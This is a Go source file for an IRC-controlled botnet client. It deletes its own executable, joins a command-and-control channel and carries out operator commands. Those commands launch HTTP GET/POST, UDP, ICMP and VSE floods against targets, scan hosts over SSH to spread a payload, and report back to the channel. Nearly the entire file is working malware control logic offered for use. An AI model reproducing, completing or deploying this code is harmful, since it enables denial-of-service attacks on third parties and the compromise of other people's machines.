package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"

	"bot/pkg"
)

////////////////////////////////////////////////////////////////////////////
//                         START CONFIG HERE!!!                          //
//////////////////////////////////////////////////////////////////////////

const (
	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
	IRC_Channel       = "" //config channel here. //"#Example"
	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
	New_Payload_Name  = "" //config new payload name. //For curl process.
)

//////////////////////////////////////////////////////////////////////////
//                         STOP CONFIG HERE!!!                         //
////////////////////////////////////////////////////////////////////////

func main() {
	if runtime.GOOS == "linux" {
		os.Remove(os.Args[0])
	} else {
		os.Remove(os.Args[0])
		os.Exit(0)
	}
	irc := pkg.IRC_Conn(IRC_Server)
	tp := textproto.NewReader(bufio.NewReader(irc))
	pkg.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)

	for {
		ircRead, err := tp.ReadLine()

		//Server interact
		go func() {
			if err != nil {
				os.Exit(0)
			}
			if pkg.IRC_Find(ircRead, "PING :") {
				pkg.IRC_Send(irc, "PONG "+pkg.IRC_Recv(ircRead, 1))
			}
		}()

		//Join IRC channel
		if pkg.IRC_Find(ircRead, "+iwx") || pkg.IRC_Find(ircRead, "+i") ||
			pkg.IRC_Find(ircRead, "+w") || pkg.IRC_Find(ircRead, "+x") {
			pkg.IRC_Send(irc, fmt.Sprint("JOIN "+IRC_Channel+IRC_Chan_Password))
		}

		//Check bot herder commands
		go func() {
			if pkg.IRC_Find(ircRead, "?get") {
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START HTTP GET FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.GET(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if pkg.IRC_Find(ircRead, "?post") {
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START HTTP POST FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.POST(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if pkg.IRC_Find(ircRead, "?udp") {
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START UDP FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.UDP(pkg.IRC_Recv(ircRead, 4), pkg.IRC_Recv(ircRead, 5), IRC_Channel, irc)
			} else if pkg.IRC_Find(ircRead, "?icmp") {
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START ICMP FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.ICMP(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if pkg.IRC_Find(ircRead, "?vse") {
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START VSE FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.VSE(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if pkg.IRC_Find(ircRead, "?scan") {
				pkg.IRC_Report(irc, IRC_Channel, "START SCANNING.")
				pkg.SSH_Conn(irc, pkg.IRC_Recv(ircRead, 4), IRC_Channel, New_Payload_Name)
			} else if pkg.IRC_Find(ircRead, "?info") {
				pkg.ReportInf(irc, IRC_Channel)
			} else if pkg.IRC_Find(ircRead, "?kill") {
				os.Exit(0)
			} else if pkg.IRC_Find(ircRead, "?stopddos") {
				pkg.DDoS_Switch = true
				pkg.IRC_Report(irc, IRC_Channel, "STOP ATTACKING.")
			} else if pkg.IRC_Find(ircRead, "?stopscan") {
				pkg.Scan_Switch = true
				pkg.IRC_Report(irc, IRC_Channel, "STOP SCANNING.")
			}
		}()
	}
}
